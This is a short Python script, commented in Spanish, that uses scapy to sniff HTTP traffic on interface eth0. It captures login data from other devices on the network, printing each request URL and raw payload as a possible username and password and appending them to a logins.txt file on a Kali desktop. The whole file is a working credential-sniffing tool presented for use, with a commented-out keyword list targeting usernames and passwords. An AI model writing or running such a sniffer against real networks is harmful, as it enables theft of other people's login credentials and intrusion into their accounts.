from ast import keyword
import scapy.all as scapy
from scapy.layers import http

#Recibe los paguetes de los dispositivos conectados a la red
def sniff(interface):
    scapy.sniff(iface= interface, store= False, prn= processSniffedPacket)

def processSniffedPacket(packet):
    #Imprime los packetes de la capa HTTP y en la capa Raw de scapy que es donde se capturan los datos del login
    if packet.haslayer(http.HTTPRequest):
        url = packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path
        print(f'HTTP Request >> {url.decode()}')

        #Sólo imprimirá los datos de la capa Raw de Scapy que es donde se almacenan los datos de inicio de sesión
        if packet.haslayer(scapy.Raw):
            load = packet[scapy.Raw].load
            #keywords = ['username', 'user', 'login', 'password', 'pass']
            print(f'\n\nUsuario y contraseña posible >> {load.decode()}\n\n')

            with open('/home/kali/Desktop/logins.txt', 'a') as f:
                f.writelines(f'Sitio web: {url}\nLogin: {load.decode()}\n')

            '''for i in keywords:
                if i in load:
                    print(load)
                    break'''

sniff('eth0')
